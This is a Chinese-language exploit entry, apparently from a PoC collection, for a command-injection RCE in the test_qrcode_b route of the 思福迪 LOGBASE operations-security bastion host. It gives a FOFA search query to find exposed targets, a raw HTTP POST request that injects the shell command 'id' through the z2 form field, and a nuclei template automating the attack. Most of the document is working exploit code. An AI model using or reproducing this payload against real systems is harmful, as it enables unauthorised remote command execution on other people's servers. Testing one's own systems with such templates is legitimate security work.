## 思福迪运维安全管理系统RCE漏洞
思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞，可以导致服务器被攻击者远控。

## 影响版本
```
思福迪-LOGBASE
```

## fofa
```
app="思福迪-LOGBASE"
```

## poc
```
POST /bhost/test_qrcode_b HTTP/1.1
Host: BaseURL
User-Agent: Go-http-client/1.1
Content-Length: 23
Accept-Encoding: gzip
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: BaseURL

z1=1&z2="|id;"&z3=bhost
```

## nuclei poc
```

id: SAFETY-test_qrcode_b-rce

info:
  name: 思福迪 运维安全管理系统 test_qrcode_b 远程命令执行漏洞
  author: fgz
  severity: critical
  description: '思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞，可以导致服务器被攻击者远控。'
  tags: 2023,SAFETY,LogBase,思福迪,rce
  metadata:
    max-request: 3
    fofa-query: app="思福迪-LOGBASE"
    verified: true

http:
  - method: POST
    path:
      - "{{BaseURL}}/bhost/test_qrcode_b"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Connection: close
      Referer: "{{BaseURL}}"
      Accept-Encoding: gzip
    body: 'z1=1&z2="|id;"&z3=bhost'
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body,'uid')"

```

